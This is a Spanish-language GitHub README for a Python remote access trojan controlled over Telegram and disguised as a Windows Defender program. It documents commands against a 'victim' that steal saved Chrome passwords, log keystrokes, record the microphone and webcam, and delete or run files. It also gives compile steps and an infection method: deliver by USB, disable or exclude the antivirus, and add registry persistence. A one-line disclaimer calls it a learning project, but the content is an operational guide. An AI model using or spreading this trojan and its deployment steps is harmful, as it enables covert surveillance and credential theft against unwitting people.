````
  ╔═══╦═══╦════╗        ╔════╗ ╔╗                ╔╗╔╗╔╗     ╔╗
  ║╔═╗║╔═╗║╔╗╔╗║        ║╔╗╔╗║ ║║                ║║║║║║     ║║
  ║╚═╝║║ ║╠╝║║╚╝╔╗╔╦╦══╗╚╝║║╠╩═╣║╔══╦══╦═╦══╦╗╔╗ ║║║║║╠╦═╗╔═╝╠══╦╗╔╗╔╦══╗
  ║╔╗╔╣╚═╝║ ║║  ║╚╝╠╣╔╗║  ║║║║═╣║║║═╣╔╗║╔╣╔╗║╚╝║ ║╚╝╚╝╠╣╔╗╣╔╗║╔╗║╚╝╚╝║══╣
  ║║║╚╣╔═╗║ ║║  ╚╗╔╣║╔╗║  ║║║║═╣╚╣║═╣╚╝║║║╔╗║║║║ ╚╗╔╗╔╣║║║║╚╝║╚╝╠╗╔╗╔╬══║
  ╚╝╚═╩╝ ╚╝ ╚╝   ╚╝╚╩╝╚╝  ╚╝╚══╩═╩══╩═╗╠╝╚╝╚╩╩╩╝  ╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚╝╚══╝
                                    ╔═╝║                 
                                    ╚══╝                   v 1.0.0
````
[![Made with Python](https://img.shields.io/badge/Made%20with-Python-3572A5.svg)](https://github.com/SebastianEPH)


__Nota:__ Éste proyecto tiene como finalidad el aprendizaje de ciberseguridad y hacking, no me hago responsable de un posible mal uso de ésta herramienta

[Read this documentation in English](Doc/README.md)

# Información Importante
* __Fecha de documentación :__ `07/05/2020`
* __Versión:__ v`1.0.0`
* __Peso compilado:__ `45MB` aproximadamente
* __Versión Python:__ `3.7` (Obligatoriamente debe ser ésta versión)

## Archivos del repositorio - Github 
![Archivos](https://i.imgur.com/G57rYkC.png)
- `Doc`    = Contiene la documentación en ingles
- `Compilar.bat`    = Convierte el archivo `*.py` a `*.exe`
- `Ejecutar.bat`    = Ejecuta el RAT en consola, se muestra una consola.
- `iconDefender.ico`    = Icono Windows Defender
- `LICENCE` = Licencia 
- `proxy.py` = librería `*.py` , _no mover ni modificar_
- `README.md`= Ésta Documentación
- `StartUp.reg` = Modifica el Registro de Windows
- `versionN.txt` = Información detalla de conversión `*.py` a `*.exe`
- `WindowsDefenderAdvanced.py` = Código fuente del RAT via Telegram Windows

# Requerimientos de espacio de trabajo
__Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)

__Librerías utilizadas__

* __import__ `winshell`
* __import__ `tendo`
* __import__ `pypiwin32`
* __import__ `pyinstaller`
* __import__ `psutil`
* __import__ `pillow`
* __import__ `opencv-python`
* __import__ `sys`
* __import__ `threading`
* __import__ `datetime`
* __import__ `argparse`
* __import__ `logging`
* __import__ `socket`
* __import__ `select`

# Funcionalidades
## /apagar
`Apaga la computadora de la victima`
## /audio
`Graba desde el microfono [Victima]`

__Ejemplo:__
````
/audio [Tiempo en segundos]
/audio 45
````


## /captura
`Toma una captura de pantalla - [Victima]`
## /ir
`Navega entre carpetas - [Victima]`

__Ejemplo:__
````
/ir [Ruta entre comillas dobles y debe terminar con un "\"]

/ir "D:\SoftwarePortable\Android Studio\"
````
## /listar
`Muestra la lista de archivos que se encuentran en una carpeta - [Victima]`

__Ejemplo:__
````
/listar [Ruta entre comillas dobles y debe terminar con un "\"]

/listar "D:\SoftwarePortable\Android Studio\plugins\"
````

## /cmd_dns
`Muestra la información desde la DNS - [Victima]`
## /copiar 
`Copia un archivo de una carpeta a otra - [Victima]`

__Ejemplo:__
````
/copiar [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/copiar  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Anonymous\Desktop\virus.exe"
````

## /descargar
`Descarga un archivo - [Victima]`

__Ejemplo:__
````
/descargar [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/descargar "O:\OneDrive - xKx\Pictures\Developer Software\Website\logo.png"
````

## /ejecutar
`Ejecuta un EXE - [Victima]`

__Ejemplo:__
````
/ejecutar [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/ejecutar "C:\Users\Public\virus.exe"
````
## /eliminar
`Elimina un archivo o carpeta - [Victima]`

__Ejemplo:__
````
/eliminar [Ruta entre comillas dobles y debe terminar con un "\" o con la extensión del archivo]

/eliminar "D:\Photos\FotosFamilia\"
/eliminar "D:\Photos\FotosFamilia\03122019.jpg"
````
## /enviar
`Envía archivos de nuestra PC o celular a la [Victima]`

__Ejemplo:__
````
/enviar [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/enviar  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Victima\Documents\NoEsvirus.exe"
````

## /fondo
`Cambia fondo de pantalla - [Victima]`

__Ejemplo:__

````
/fondo   C:/Users/User/Desktop/porn.jpg
````
## /get_chrome
`Obtiene las contraseñas guardadas en Chrome - [Victima]`
## /get_key
`Obtiene el registro de teclas - [Victima]`
## /ip_info
`Obtiene la información desde la IP [Victima]`
## /mover
`Mueve archivos - [Victima]`

__Ejemplo:__
````
/mover [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/mover  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Anonymous\Desktop\virus.exe"
````

## /proxy
`Crea  - [Victima]`

`Creo que abre un puerto a la victima. <= por verificar`
## /red_info
`Muestra información de la red- [Victima]`
## /reiniciar
`Reinicia la computadora - [Victima]`
## /tareas
`Muestra información de procesos  - [Victima]`

![dsf](https://i.imgur.com/miav5Y8.png)

## /test
`Verifica si la [Victima] se encuentra en linea`
## /this
`Muestra la ruta donde se encuentra el RAT`
## /web
`Abre un URL en el navegador predeterminado de `
__Ejemplo:__

````
/web   https://www.youtube.com/watch?v=ywGOLN0dDKU
/web   https://www.xxx.com
````
## /webcam
`Graba o toma foto de la webcam`

__NOTA:__`  No probado, tampoco sé si la luz de la webCam se enciende.`
___
___

## Futuras caracteristicas
Se está trabajando en las siguientes caracteristicas y se iran habilitando en las siguientes actualizaciones
![futuras actualizaciones](https://i.imgur.com/CnA3G20.png)

# Preparación

__Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)

* Editar el archivo `WindowsDefenderAdvanced.py`
![Archivo Windows defender advances troyano](https://i.imgur.com/5F3hN97.png)
* Creamos en GotFather un Bot y obtenemos nuestro token
* Entramos y agregamos nuestro token del bot 
![agregar ](https://i.imgur.com/2QEyPfg.png)
* lo que sigue despues es obtener el ID de nuestro chat, pero para eso necesitamos ua ejecutar nuestro RAT.
* Para ejecutarlo, busque el archivo `Ejecutar.bat` => Y le damos a editar.
![Ejecutar.bat](https://i.imgur.com/IO15FFn.png)
* He insertamos la ruta donde se encuentra nuestro RAT
![ejecutar.bat data](https://i.imgur.com/IErOgU2.png)
* Una vez terminado ya podemos ejecutar nuestro RAT y en la consola se verá algo así.
![](https://i.imgur.com/oxKZHcm.png)
* Y en nuestro telegram tenemos que mandar un comando, para recibir nuestro ID del chat
![](https://i.imgur.com/TbX0swa.png)
* Y en nuestra consola aparecerá nuestro ID del chat
![chat id](https://i.imgur.com/3GEs4g2.png)
* Y este chat ID tenemos que escribirlo en el archivo `WindowsDefenderAdvanced.py`

![](https://i.imgur.com/psqD3sj.png)
* Y listo, ahora nuestro RAT solo responderá a nuestro ID privado, nadie más podrá tener ese acceso. ya está listo para compilar.


## Conversión de `*.py a *.exe`:
* Busque el archivo `Compilar.bat`
![Compilar.bat](https://i.imgur.com/bM9qBQg.png)
* => Clic derecho => Editar 
![Compilar.bat código](https://i.imgur.com/upyuCW8.png)
Y colocamos la ruta de la carpeta donde se encuentra el RAT
* => Guardamos => Ejecutamos para compilar...
![](https://i.imgur.com/fj0Bzri.png)
* Listo, el RAT se compiló exitosamente.


# Método de infección:
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/lGjXUlC.png)
- Usten tendrá al finalizar 2 archivos:
- El archivo llamado `WindowsDefenderAdvanced.exe` que es el RAT
- El archivo llamado `StartUp.reg`, modifica el registro de windows, y hace que el `RAT`se ejecute siempre al iniciar el usuario.

__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia de nombre, algunas funcionalidades , como la del troyano no se iniciarán.
- Usten guardará esos archivos en un USB
- Es necesario desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`
- Lo siguiente es ejecutar el archivo `WindowsDefenderAdvanced.exe` en el USB, el RAT se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el keylogger se estará replicando en la ruta.
- Lo siguiente es darle 2 click al archiv `StartUp.reg`, y ésto hará que el registro de windows sea modificado y el keylogger se ejecute 
- __Nota:__ No hay un orden fijo, usted puede ejecutar primero el archivo `WindowsDefenderAdvanced.exe` cómo el archivo `StartUp.reg` y  ésto no causará ningún problema.

___
___
# Creador 
* __Repositorio Original:__ [mvrozanti](https://github.com/mvrozanti/RAT-via-Telegram) <== Es el creador original de éste repositorio.
* __Repostitorio:__ [Keylogger_Python](https://github.com/SebastianEPH/Keylogger_Python) <== Éste repositorio fue integrado en un 50% dentro de [RAT_via_Telegram_Windows](https://github.com/SebastianEPH/RAT_via_Telegram_Windows).
## By SebastianEPH
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)